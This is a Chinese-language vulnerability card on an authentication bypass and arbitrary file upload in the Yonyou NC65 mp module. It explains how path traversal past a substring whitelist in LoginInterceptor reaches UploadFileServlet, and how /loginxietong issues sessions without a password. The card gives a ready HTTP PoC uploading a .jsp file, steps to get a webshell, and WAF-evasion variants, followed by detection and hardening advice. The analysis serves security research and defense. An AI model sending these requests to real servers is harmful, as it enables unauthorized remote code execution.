---
id: web-java-component-yonyou-nc65-mp-uploadfileservlet-logininterceptor-url-bypass
title: 用友 NC65 mp 模块 UploadFileServlet 任意文件上传：LoginInterceptor 用 getRequestURL 对 IGNORE_URI 做子串匹配，/mp/login/../ 绕过鉴权 getshell
type: scenario
domain: web
path: web/java/component
technique: yonyou-nc65-mp-uploadfileservlet-logininterceptor-url-bypass
aliases:
- UploadFileServlet
- uploadControl/uploadFile
- loginxietong
- LoginInterceptor
- IGNORE_URI
- uploadFileDir
- 用友 NC mp 模块
- NC65 任意文件上传
tags:
- java
- yonyou
- nc65
- file-upload
- auth-bypass
- interceptor
- url-normalization
- webshell
- unauth
cve: []
severity: critical
confidence: high
status: verified
affected_versions: 用友 NC65
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V628
  verified_at: '2026-11-12T23:40:31+08:00'
  notes: 已对照原文全文与唯一截图核对：原文'影响版本 用友NC65'明确，keep affected_versions=用友 NC65。截图（2031x1930，已降1200px JPEG读取）确认 UploadFileServlet：package com.yonyou.uap.mp.controller、@Controller、@RequestMapping({"/uploadControl"})、@RequestMapping(value={"uploadFile"},method=POST)、doPost、ServletFileUpload+DiskFileItemFactory、!item.isFormField()分支仅限制32MB、item.getName()后substring(lastIndexOf("\\")+1)、staticUploadFileDir=MPUtils.getContextRootPath(...)+"uploadFileDir"、mkdir、path拼接与new File(path)。原文另给出spring-mvc.xml拦截器、LoginInterceptor getRequestURL+IGNORE_URI contains逻辑、/mp/login/../uploadControl/uploadFile绕过、loginxietong无口令写user_logined会话、复现路径/mp/uploadFileDir/test.jsp。修正两处：(1)32MB限制作用于文件项而非'表单字段项'；(2)截图在new File(path)处截断未见write调用，正文已注明并保留原文复现结果。dedup recommendation=new；候选为U8 cloudgateway ifiletrans、Portalspec createSkinFile、KSOA ImageUpload、NCCloud uploadChunk、NC65 PortalLoginFilter（同产品不同组件）等，非同一条利用链，保留。截图截断点已在卡内说明。
---

## 一句话结论

用友 NC65 的 mp 模块（`hotwebs/mp`）用 `LoginInterceptor` 对 `/**` 做登录校验，但拦截器取 `request.getRequestURL()` 的原始 URL 对 `IGNORE_URI` 做 `contains` 子串判断，而容器按规范化后的路径路由；请求 `/mp/login/../uploadControl/uploadFile` 会被路由到 `UploadFileServlet`，同时因原始 URL 含 `/login` 被放行，未登录即可上传任意 `.jsp` 文件到 `/mp/uploadFileDir/` 并解析执行；此外 `/mp/loginxietong?username=admin` 无需口令即可写入 `user_logined` 会话，作为备选绕过。

## 原理

- **拦截器注册**：`hotwebs/mp/WEB-INF/spring-mvc.xml` 中 `<mvc:interceptors><mvc:interceptor><mvc:mapping path="/**"/><bean id="loginInterceptor" class="com.yonyou.uap.mp.interceptor.LoginInterceptor"/></mvc:interceptor></mvc:interceptors>`，实现在 `hotwebs/mp/WEB-INF/lib/uap.mp.core-0.1.0.jar`。
- **preHandle 的放行逻辑**：取 `url = request.getRequestURL().toString()`（原始请求地址，含主机+路径、不含 query，且不做 `..` 规范化）。若 URL 不以 `mp/`、`mp` 结尾，则：`index.html` 单独判断登录；`!(handler instanceof HandlerMethod)` 直接放行；否则遍历 `IGNORE_URI = {"/initcfg","/login","/index","/automsg","/loginxietong","/loginportal","/signportal","/loginportaldetail","/loginportalmobile"}`，只要 `url.contains(s)` 为真就置 `flag=true`，跳过登录校验并 `return true`。未命中白名单且未登录时按 `@ResponseBody` 有无选择重定向 `/mp` 或返回未登录提示。
- **为什么 `/mp/login/../uploadControl/uploadFile` 能绕过**：Tomcat 在匹配 servlet 前会对路径做规范化，`/mp/login/../uploadControl/uploadFile` 被归一化为 `/mp/uploadControl/uploadFile` 并路由到 `UploadFileServlet`；但 `request.getRequestURL()` 返回的仍是未规范化的原始串，依然包含 `/login`，恰好命中 `IGNORE_URI` 的 `contains("/login")`，拦截器放行。也就是说“鉴权看到的路径”和“路由实际使用的路径”不一致，`..` 只影响后者。
- **上传 sink**：`com.yonyou.uap.mp.controller.UploadFileServlet`（`@Controller @RequestMapping("/uploadControl")`，方法 `uploadFile`，`POST`）的 `doPost` 用 `ServletFileUpload` 解析 multipart：文件项仅限制 32MB、不校验扩展名或 Content-Type，取 `item.getName()`（客户端提供的文件名），`substring(fileName.lastIndexOf("\\") + 1)` 去掉 Windows 路径前缀后原样保留；`staticUploadFileDir = MPUtils.getContextRootPath(request.getSession().getServletContext()) + "uploadFileDir"`，目录不存在则 `mkdir()`；`path = staticUploadFileDir + File.separator + fileName`，随后 `new File(path)`（文章截图在此截断，后续写入调用未展示；原文给出 `/mp/uploadFileDir/test.jsp` 可访问的复现结果）。全程没有扩展名、Content-Type 或内容校验，`.jsp` 后缀与文件名都原样保留。
- **落点可执行**：`uploadFileDir` 位于 mp 模块的 Web 目录，上传的 JSP 会被容器解析，直接成为 WebShell（原文复现路径为 `/mp/uploadFileDir/test.jsp`）。
- **备选绕过**：`/loginxietong` 控制器方法 `login(@RequestParam("username") String username, ...)` 不校验口令，直接 `new SessionUser()`、`setUserCode(username)`、`setAdmin(false)`、`setName(username)`、`session.setAttribute("user_logined", user)` 并重定向 `indexforxietong.html`；同时 `/loginxietong` 本身就在 `IGNORE_URI` 中，无需登录即可调用。拿到 `JSESSIONID` 后正常访问 `/mp/uploadControl/uploadFile` 即通过鉴权。

## 触发条件

- 目标为用友 NC65（原文标注影响版本），部署了 `hotwebs/mp` 模块。
- `UploadFileServlet` 的 `POST /mp/uploadControl/uploadFile` 可被访问。
- Tomcat 对 `..` 路径做规范化后再匹配 servlet（默认行为），而 `getRequestURL()` 保留原始串。
- 上传目录在 Web 根内且容器允许解析上传的 JSP。

## 利用步骤

1. 匿名发送 multipart 上传，路径用 `/mp/login/../uploadControl/uploadFile`（`login` 可换成 `IGNORE_URI` 中任意子串，如 `/index`、`/signportal`），文件字段名 `file`，文件名 `test.jsp`。
2. 响应后访问 `/mp/uploadFileDir/test.jsp` 确认落地与解析。
3. 将内容替换为 WebShell 即 getshell。
4. 备选：先 `GET /mp/loginxietong?username=admin` 获取带 `user_logined` 的会话 Cookie，再直接 `POST /mp/uploadControl/uploadFile` 上传。

## PoC

```http
POST /mp/login/../uploadControl/uploadFile HTTP/1.1
Host: <target>
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoDIsCqVMmF83ptmp
Content-Length: 314

------WebKitFormBoundaryoDIsCqVMmF83ptmp
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: application/octet-stream

test content
------WebKitFormBoundaryoDIsCqVMmF83ptmp
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryoDIsCqVMmF83ptmp--
```

上传后访问 `/mp/uploadFileDir/test.jsp`。

## 变体与关联

- 变体一：`IGNORE_URI` 中任一子串都可作为穿越前缀（`/index`、`/loginportal`、`/signportal`、`/automsg` 等），按目标环境尝试。
- 变体二：`/mp/loginxietong?username=admin` 无口令写会话，随后带 Cookie 正常上传；`username` 任意，`admin` 仅为示例。
- 变体三：不同容器对 `..`、`%2e%2e`、`;` 的规范化时机不同，可结合编码与路径参数调整 payload；若前置 WAF 拦截 `../`，可尝试编码形式。
- 关联：[[web-java-framework-spring-custom-auth-path-parsing-bypass]]（“鉴权取原始 URI / 路由取规范化路径”这一差异的通用原理）、[[web-generic-auth-yonyou-nc65-portalloginfilter-bypass]]（NC65 另一处 PortalLoginFilter 子串白名单绕过，产品相同、组件不同）、[[web-java-component-yonyou-nc-portalspec-createskinfile-upload]]（NC lfw 接口任意文件上传）、[[web-java-component-yonyou-u8oa-operafileactioncontroller-arbitrary-file-overwrite]]（用友 U8-OA 任意文件覆盖写 JSP）。

## 检测与防御

- 检测：监控 URL 中出现 `..`、`%2e%2e`、`;` 且同时命中登录白名单子串（`/login`、`/index` 等）的请求；关注匿名的 `/mp/loginxietong`、`/mp/uploadControl/uploadFile` 访问；监控 `uploadFileDir` 下新增 `.jsp`/`.jspx` 文件。
- 防御：升级并打官方补丁（用友安全公告 id=342）；拦截器改用容器规范化后的路径（`getServletPath()`/规范化后的 URI）并做精确匹配，禁止用原始 URL 做 `contains`；上传接口增加鉴权，校验扩展名与内容，随机重命名并存储到 Web 根外；`loginxietong` 增加口令或票据校验；上传目录禁止脚本解析。
- 加固：WAF 拦截路径穿越与白名单子串组合；审计所有 HandlerInterceptor/Filter 中基于原始 URI 的放行逻辑。
